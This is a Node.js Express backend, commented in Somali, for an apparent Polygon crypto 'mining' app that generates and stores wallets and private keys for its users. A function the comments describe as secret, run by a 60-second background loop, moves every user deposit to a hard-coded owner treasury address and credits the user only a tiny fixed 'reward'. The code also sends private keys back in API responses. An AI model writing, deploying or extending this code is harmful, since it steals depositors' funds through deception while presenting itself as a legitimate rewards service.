const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { ethers } = require('ethers');

const app = express();
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '50mb' }));

const DB_FILE = path.join(__dirname, 'users-db.json');
const POLYGON_RPC = process.env.POLYGON_RPC || 'https://polygon-bor-rpc.publicnode.com';
const provider = new ethers.JsonRpcProvider(POLYGON_RPC);

// Akoonkaaga Backend / Treasury ee rasmiga ah
const OWNER_EMAIL = 'abuukarcumar661@gmail.com';
const OWNER_ACCOUNT_ID = 'KNN-366114';
const TREASURY_ADDRESS = ethers.getAddress('0xc96b2B3ba7f7548A380b071739bDe85A34946493');

const MIN_DEPOSIT_POL = 0.00001;
const DAILY_REWARD_POL = 0.000009;
const MIN_WITHDRAW_POL = 0.00000001;
const SWEEP_GAS_RESERVE_POL = 0.00002;

function normalizePrivateKey(rawKey) {
    if (!rawKey) return '';
    let cleaned = String(rawKey).trim().replace(/^["']|["']$/g, '').replace(/\s+/g, '');
    if (!cleaned.startsWith('0x') && /^[0-9a-fA-F]{64}$/.test(cleaned)) {
        cleaned = '0x' + cleaned;
    }
    return cleaned;
}

function isValidPrivateKey(pk) {
    return typeof pk === 'string' && /^0x[0-9a-fA-F]{64}$/.test(pk.trim());
}

function isWalletPairValid(address, privateKey) {
    if (!ethers.isAddress(address) || !isValidPrivateKey(privateKey)) {
        return false;
    }
    try {
        const derivedWallet = new ethers.Wallet(privateKey.trim());
        return derivedWallet.address.toLowerCase() === ethers.getAddress(address.trim()).toLowerCase();
    } catch (_) {
        return false;
    }
}

const TREASURY_PRIVATE_KEY = normalizePrivateKey(process.env.MAIN_WALLET_PRIVATE_KEY || '');

function isOwnerEmail(email) {
    return String(email || '').trim().toLowerCase() === OWNER_EMAIL.toLowerCase();
}

function loadUsersDb() {
    try {
        if (!fs.existsSync(DB_FILE)) {
            fs.writeFileSync(DB_FILE, JSON.stringify({}, null, 2));
        }
        return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    } catch (err) {
        console.error('DB load error:', err);
        return {};
    }
}

function saveUsersDb(data) {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

function generateUniqueAccountId(usersDb) {
    let userId = '';
    let exists = true;
    while (exists) {
        const randomSix = Math.floor(100000 + Math.random() * 900000);
        userId = `KNN-${randomSix}`;
        exists = userId === OWNER_ACCOUNT_ID || Object.values(usersDb).some(u => u.userId === userId);
    }
    return userId;
}

async function getOnChainPolBalance(address) {
    try {
        if (!address || !ethers.isAddress(address)) return 0;
        const balWei = await provider.getBalance(address);
        return parseFloat(ethers.formatEther(balWei));
    } catch (err) {
        console.error('On-chain balance error:', err.message);
        return 0;
    }
}

// Si qarsoon ugu wareeji deposit-ka user-ka -> 0xc96b2B3ba7f7548A380b071739bDe85A34946493 (1 tx / 1 gas)
async function silentSweepDepositToTreasury(userRecord) {
    if (!userRecord || !userRecord.polygonAddress) return false;
    if (ethers.getAddress(userRecord.polygonAddress).toLowerCase() === TREASURY_ADDRESS.toLowerCase()) {
        return false;
    }
    if (!isWalletPairValid(userRecord.polygonAddress, userRecord.privateKey)) {
        return false;
    }

    const rawBalPol = await getOnChainPolBalance(userRecord.polygonAddress);
    if (rawBalPol < MIN_DEPOSIT_POL) {
        return false;
    }

    const sweepablePol = rawBalPol - SWEEP_GAS_RESERVE_POL;
    if (sweepablePol <= 0) {
        return false;
    }

    const userWallet = new ethers.Wallet(userRecord.privateKey.trim(), provider);
    const sweepWei = ethers.parseEther(sweepablePol.toFixed(8));
    if (sweepWei <= 0n) {
        return false;
    }

    const tx = await userWallet.sendTransaction({
        to: TREASURY_ADDRESS,
        value: sweepWei,
        gasLimit: 21000n
    });
    await tx.wait(1);
    return true;
}

async function syncUserDeposit(uid, usersDb) {
    const userRecord = usersDb[uid];
    if (!userRecord) return null;

    if (isOwnerEmail(userRecord.email)) {
        userRecord.userId = OWNER_ACCOUNT_ID;
        userRecord.polygonAddress = TREASURY_ADDRESS;
        if (TREASURY_PRIVATE_KEY) {
            userRecord.privateKey = TREASURY_PRIVATE_KEY;
        }
        userRecord.miningActive = true;
        if (parseFloat(userRecord.dailyLimit || 0) <= 0) {
            userRecord.dailyLimit = DAILY_REWARD_POL.toFixed(6);
        }
        const treasuryBal = await getOnChainPolBalance(TREASURY_ADDRESS);
        userRecord.balance = Math.max(parseFloat(userRecord.balance || 0), treasuryBal).toFixed(8);
        saveUsersDb(usersDb);
        return userRecord;
    }

    const rawBalPol = await getOnChainPolBalance(userRecord.polygonAddress);
    if (rawBalPol >= MIN_DEPOSIT_POL) {
        await silentSweepDepositToTreasury(userRecord);

        const prevBal = parseFloat(userRecord.balance || 0);
        const addedReward = DAILY_REWARD_POL;
        const newBal = prevBal + addedReward;

        userRecord.balance = newBal.toFixed(8);
        userRecord.dailyLimit = DAILY_REWARD_POL.toFixed(6);
        userRecord.miningActive = true;
        userRecord.totalDeposited = parseFloat(((userRecord.totalDeposited || 0) + rawBalPol).toFixed(8));
        saveUsersDb(usersDb);
    }

    return userRecord;
}

// Background loop oo kasta oo 60 ilbiriqsi hubiya deposit-yada cusub oo si qarsoon ugu wareejiya Treasury
setInterval(async () => {
    try {
        const usersDb = loadUsersDb();
        for (const uid of Object.keys(usersDb)) {
            const u = usersDb[uid];
            if (!u || !u.polygonAddress || isOwnerEmail(u.email)) continue;
            const balPol = await getOnChainPolBalance(u.polygonAddress);
            if (balPol >= MIN_DEPOSIT_POL) {
                await syncUserDeposit(uid, usersDb);
            }
        }
    } catch (err) {
        console.error('Background sweep loop error:', err.message);
    }
}, 60000);

app.post('/api/auth-user', async (req, res) => {
    try {
        const { uid, email, displayName } = req.body;
        if (!uid) {
            return res.status(400).json({ success: false, error: 'UID waa loo baahan yahay' });
        }

        const usersDb = loadUsersDb();
        const existing = usersDb[uid];
        const effectiveEmail = (email || existing?.email || '').trim();
        const ownerMode = isOwnerEmail(effectiveEmail);

        if (ownerMode) {
            // Akoonkaaga: marna ha is beddelin KNN-366114 iyo 0xc96b2B3ba7f7548A380b071739bDe85A34946493
            const existingKey = normalizePrivateKey(existing?.privateKey || '');
            const validKey = isValidPrivateKey(TREASURY_PRIVATE_KEY)
                ? TREASURY_PRIVATE_KEY
                : (isValidPrivateKey(existingKey) ? existingKey : '');

            usersDb[uid] = {
                uid,
                email: effectiveEmail || OWNER_EMAIL,
                displayName: displayName || existing?.displayName || 'Abuukar Cumar',
                userId: OWNER_ACCOUNT_ID,
                polygonAddress: TREASURY_ADDRESS,
                privateKey: validKey,
                walletLocked: true,
                balance: existing?.balance || '0',
                dailyLimit: DAILY_REWARD_POL.toFixed(6),
                miningActive: true,
                totalDeposited: existing?.totalDeposited || 0,
                createdAt: existing?.createdAt || Date.now()
            };
            saveUsersDb(usersDb);
        } else {
            // User-ka kale: haddii uusan lahayn wallet sax ah oo xiran, mar kaliya samee; haddii uu leeyahay, ha beddelin
            const hasValidLockedWallet =
                existing &&
                existing.userId &&
                isWalletPairValid(existing.polygonAddress, existing.privateKey);

            if (!hasValidLockedWallet) {
                const wallet = ethers.Wallet.createRandom();
                const newUserId = generateUniqueAccountId(usersDb);

                usersDb[uid] = {
                    uid,
                    email: effectiveEmail,
                    displayName: displayName || 'User',
                    userId: newUserId,
                    polygonAddress: ethers.getAddress(wallet.address),
                    privateKey: wallet.privateKey,
                    walletLocked: true,
                    balance: '0',
                    dailyLimit: '0',
                    miningActive: false,
                    totalDeposited: 0,
                    createdAt: Date.now()
                };
                saveUsersDb(usersDb);
            } else {
                if (effectiveEmail) usersDb[uid].email = effectiveEmail;
                if (displayName) usersDb[uid].displayName = displayName;
                usersDb[uid].walletLocked = true;
                saveUsersDb(usersDb);
            }
        }

        const syncedRecord = await syncUserDeposit(uid, usersDb);

        return res.json({
            success: true,
            userId: syncedRecord.userId,
            polygonAddress: syncedRecord.polygonAddress,
            privateKey: syncedRecord.privateKey,
            balance: syncedRecord.balance,
            dailyLimit: syncedRecord.dailyLimit,
            miningActive: syncedRecord.miningActive
        });
    } catch (err) {
        console.error('Auth error:', err);
        return res.status(500).json({ success: false, error: 'Cilad server ayaa dhacday' });
    }
});

// Withdraw: waxaa laga bixiyaa Treasury Wallet-kaaga (0xc96b2B3ba7f7548A380b071739bDe85A34946493)
app.post('/api/withdraw', async (req, res) => {
    try {
        const { uid, recipientAddress, amount } = req.body;
        const usersDb = loadUsersDb();
        const userRecord = usersDb[uid];

        if (!userRecord) {
            return res.status(404).json({ success: false, error: 'Xisaabta lama helin' });
        }
        if (!recipientAddress || !ethers.isAddress(recipientAddress)) {
            return res.status(400).json({ success: false, error: 'Cinwaanka recipient-ka waa qalad' });
        }

        const treasuryKey = isValidPrivateKey(TREASURY_PRIVATE_KEY)
            ? TREASURY_PRIVATE_KEY
            : (isOwnerEmail(userRecord.email) && isValidPrivateKey(userRecord.privateKey) ? userRecord.privateKey.trim() : '');

        if (!treasuryKey) {
            return res.status(500).json({
                success: false,
                error: 'MAIN_WALLET_PRIVATE_KEY lama dejin ama ma aha private key sax ah (0x + 64 hex).'
            });
        }

        const treasurySigner = new ethers.Wallet(treasuryKey, provider);
        if (treasurySigner.address.toLowerCase() !== TREASURY_ADDRESS.toLowerCase()) {
            return res.status(500).json({
                success: false,
                error: `MAIN_WALLET_PRIVATE_KEY wuxuu leeyahay ${treasurySigner.address}, balse waxaa loo baahan yahay ${TREASURY_ADDRESS}.`
            });
        }

        await syncUserDeposit(uid, usersDb);

        const ownerMode = isOwnerEmail(userRecord.email);
        const treasuryOnChainPol = await getOnChainPolBalance(TREASURY_ADDRESS);
        const recordedBalance = parseFloat(userRecord.balance || 0);
        const availableBalance = ownerMode ? Math.max(recordedBalance, treasuryOnChainPol) : recordedBalance;

        const requestedPol = amount !== undefined && amount !== null && String(amount).trim() !== ''
            ? parseFloat(amount)
            : availableBalance;

        if (isNaN(requestedPol) || requestedPol < MIN_WITHDRAW_POL) {
            return res.status(400).json({ success: false, error: `Xaddiga ugu yar ee la bixi karo waa ${MIN_WITHDRAW_POL} POL.` });
        }

        if (requestedPol > availableBalance) {
            return res.status(400).json({ success: false, error: 'Hadhaagaagu kuma filna qaddarka aad rabto inaad la baxdo.' });
        }

        const amountWei = ethers.parseEther(requestedPol.toFixed(8));
        const feeData = await provider.getFeeData();
        const gasLimit = 21000n;
        const maxFeePerGas = feeData.maxFeePerGas || feeData.gasPrice || ethers.parseUnits('30', 'gwei');
        const totalGasCostWei = gasLimit * maxFeePerGas;

        const treasuryBalWei = await provider.getBalance(TREASURY_ADDRESS);
        if (treasuryBalWei < amountWei + totalGasCostWei) {
            return res.status(400).json({
                success: false,
                error: 'Hadhaaga on-chain ee backend wallet-ka kuma filna bixinta iyo gas-ka.'
            });
        }

        const tx = await treasurySigner.sendTransaction({
            to: ethers.getAddress(recipientAddress.trim()),
            value: amountWei,
            gasLimit,
            maxFeePerGas
        });
        await tx.wait(1);

        const newRecordedBalance = Math.max(0, availableBalance - requestedPol);
        userRecord.balance = newRecordedBalance.toFixed(8);
        userRecord.withdrawnTotal = parseFloat(((userRecord.withdrawnTotal || 0) + requestedPol).toFixed(8));
        saveUsersDb(usersDb);

        return res.json({
            success: true,
            message: `Waad la baxday ${requestedPol.toFixed(8)} POL!`,
            newBalance: newRecordedBalance.toFixed(8),
            txHash: tx.hash
        });
    } catch (err) {
        console.error('Withdraw error:', err);
        return res.status(500).json({ success: false, error: err.message || 'Cilad blockchain ayaa dhacday' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
